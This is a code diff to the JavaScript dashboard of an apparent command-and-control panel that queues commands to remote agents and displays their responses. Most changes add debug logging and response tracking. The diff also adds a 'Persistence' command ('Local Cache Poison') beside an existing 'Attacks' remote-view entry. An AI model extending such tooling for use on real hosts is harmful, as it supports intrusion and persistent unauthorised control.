@@ -3,10 +3,15 @@ let currentAgentId = null;
 let ws = null;
 let commandHistory = [];
 let historyIndex = -1;
+let lastSeenCommandIds = new Set(); // Track which commands we've already processed
 
 function initDashboard(agentId) {
     console.log('Initializing dashboard for agent:', agentId);
     currentAgentId = agentId;
+    
+    // Clear any previous state
+    lastSeenCommandIds.clear();
+    console.log('Cleared previous command tracking state');
     
     // Initialize accordion menu with a small delay to ensure DOM is ready
     setTimeout(() => {
@@ -45,16 +50,40 @@ function initDashboard(agentId) {
 
     // Initialize modals
     initRemoteView();
-
-    resolve(window.pako);
     initCommandHistoryModal();
     
     // Set up refresh interval for pending commands and command history
-    setInterval(() => {
-        loadPendingCommands();
-        loadCommandHistory();
+    console.log('Setting up 5-second refresh interval for command history polling...');
+    const refreshInterval = setInterval(() => {
+        const timestamp = new Date().toLocaleTimeString();
+        console.log(`[${timestamp}] Refresh interval triggered - polling for new command responses`);
+        try {
+            loadPendingCommands();
+            loadCommandHistory();
+        } catch (error) {
+            console.error('Error in refresh interval:', error);
+        }
     }, 5000); // Refresh every 5 seconds
+    
+    console.log('Refresh interval set up successfully with ID:', refreshInterval);
+    
+    // Test the loadCommandHistory function immediately to check if it works
+    console.log('Testing loadCommandHistory function immediately...');
+    setTimeout(() => {
+        loadCommandHistory();
+    }, 2000); // Test after 2 seconds to let everything initialize
 }
+
+// Debug function to manually test command history loading
+function testCommandHistoryLoading() {
+    console.log('=== MANUAL TEST: testCommandHistoryLoading ===');
+    console.log('currentAgentId:', currentAgentId);
+    console.log('window.agentName:', window.agentName);
+    loadCommandHistory();
+}
+
+// Make it available globally for console testing
+window.testCommandHistoryLoading = testCommandHistoryLoading;
 
 function loadAgentDetails(agentId) {
 
@@ -264,6 +293,12 @@ function setupCommandLibrary() {
             name: 'Attacks',
             commands: [
                 {name: "Remote View", command: 'attacks.remote_view'}
+            ]
+        },
+        {
+            name: 'Persistence',
+            commands: [
+                {name: "Local Cache Poison", command: 'cache.persist'}
             ]
         },
         {
@@ -502,6 +537,13 @@ function queueCommand(command) {
 function loadPendingCommands() {
     const queueId = window.agentName || currentAgentId;
     
+    console.log('loadPendingCommands called - queueId:', queueId);
+    
+    if (!queueId) {
+        console.log('No queueId available, skipping pending commands load');
+        return;
+    }
+    
     fetch(`/commands/agent/${queueId}/pending`, {
         method: 'GET',
         headers: {
@@ -528,7 +570,19 @@ function loadPendingCommands() {
 
 // Load command history for the current agent
 function loadCommandHistory() {
+    console.log('=== loadCommandHistory function started ===');
     const queueId = window.agentName || currentAgentId;
+    
+    console.log('loadCommandHistory called - queueId:', queueId, 'window.agentName:', window.agentName, 'currentAgentId:', currentAgentId);
+    
+    if (!queueId) {
+        console.log('ERROR: No queueId available, skipping command history load');
+        console.log('window.agentName:', window.agentName);
+        console.log('currentAgentId:', currentAgentId);
+        return;
+    }
+    
+    console.log('SUCCESS: Making API call to:', `/commands/agent/${queueId}/history`);
     
     fetch(`/commands/agent/${queueId}/history`, {
         method: 'GET',
@@ -543,9 +597,22 @@ function loadCommandHistory() {
         return response.json();
     })
     .then(data => {
-        console.log('Command history:', data);
+        console.log('Raw command history response:', data);
+        console.log('Command history commands array:', data.commands);
         // Make sure we're handling the correct data structure
         const commands = data.commands || [];
+        console.log('Processing', commands.length, 'commands from history');
+        
+        // Log each command for debugging
+        commands.forEach((cmd, index) => {
+            console.log(`Command ${index}:`, {
+                id: cmd.ID || cmd.id,
+                command: cmd.Command || cmd.command,
+                status: cmd.Status || cmd.status,
+                hasResponse: !!(cmd.Response || cmd.response),
+                responseLength: (cmd.Response || cmd.response || '').length
+            });
+        });
         
         // Process completed commands to show in console
         processCompletedCommands(commands);
@@ -584,51 +651,69 @@ function updatePendingCommandsUI(commands) {
 
 // Process command history to display responses in the console
 function processCompletedCommands(commands) {
-    if (!commands || commands.length === 0) return;
+    if (!commands || commands.length === 0) {
+        console.log('processCompletedCommands: No commands to process');
+        return;
+    }
     
-    // Get only completed commands since last check
-    const completedCommands = commands.filter(cmd => 
-        (cmd.Status === 'completed' || cmd.status === 'completed' || cmd.Status === 'failed' || cmd.status === 'failed') &&
-        !cmd.processedByConsole
-    );
+    console.log('processCompletedCommands: Processing', commands.length, 'commands');
     
-    // Sort commands by creation time
-    completedCommands.sort((a, b) => {
+    // Get only NEW completed commands that we haven't seen before
+    const newCompletedCommands = commands.filter(cmd => {
+        const commandID = cmd.ID || cmd.id;
+        const isCompleted = (cmd.Status === 'completed' || cmd.status === 'completed' || cmd.Status === 'failed' || cmd.status === 'failed');
+        const isNew = !lastSeenCommandIds.has(commandID);
+        
+        return isCompleted && isNew;
+    });
+    
+    console.log('processCompletedCommands: Found', newCompletedCommands.length, 'NEW completed commands to display');
+    
+    // Update our tracking set with all command IDs we've now seen
+    commands.forEach(cmd => {
+        const commandID = cmd.ID || cmd.id;
+        if (commandID) {
+            lastSeenCommandIds.add(commandID);
+        }
+    });
+    
+    // Sort NEW commands by creation time
+    newCompletedCommands.sort((a, b) => {
         const timeA = new Date(a.CreatedAt || a.created_at);
         const timeB = new Date(b.CreatedAt || b.created_at);
         return timeA - timeB;
     });
     
-    // Process each completed command to show in console
-    completedCommands.forEach(cmd => {
+    // Process each NEW completed command to show in console
+    newCompletedCommands.forEach(cmd => {
         const status = cmd.Status || cmd.status;
         const command = cmd.Command || cmd.command;
         const response = cmd.Response || cmd.response;
         const commandID = cmd.ID || cmd.id;
         
+        console.log(`Processing NEW command response ${commandID}: status=${status}, hasResponse=${!!response}`);
+        
+        // Display the command that was executed first
+        addConsoleMessage(`> ${command}`, 'command');
+        
         // Display response in console
         try {
             if (response) {
-                const responseObj = JSON.parse(response);
-                addConsoleMessage(responseObj, 'response');
+                console.log('Command response:', response);
+                try {
+                    const responseObj = JSON.parse(response);
+                    addConsoleMessage(responseObj, 'response');
+                } catch (parseError) {
+                    // If not valid JSON, display as plain text
+                    addConsoleMessage(response, 'response');
+                }
             } else {
+                console.log('No response data for command', commandID);
                 addConsoleMessage(`Command ${status}: No response data`, 'system');
             }
         } catch (e) {
-            // If not JSON, display as is
-            if (response) {
-                addConsoleMessage(response, 'response');
-            } else {
-                addConsoleMessage(`Command ${status}: No response data`, 'system');
-            }
-        }
-        
-        // Mark command as processed
-        cmd.processedByConsole = true;
-        
-        // Remove the command from history after displaying the response
-        if (commandID) {
-            removeCompletedCommandFromHistory(commandID);
+            console.log('Error processing response:', e);
+            addConsoleMessage(`Error processing response: ${e.message}`, 'error');
         }
     });
 
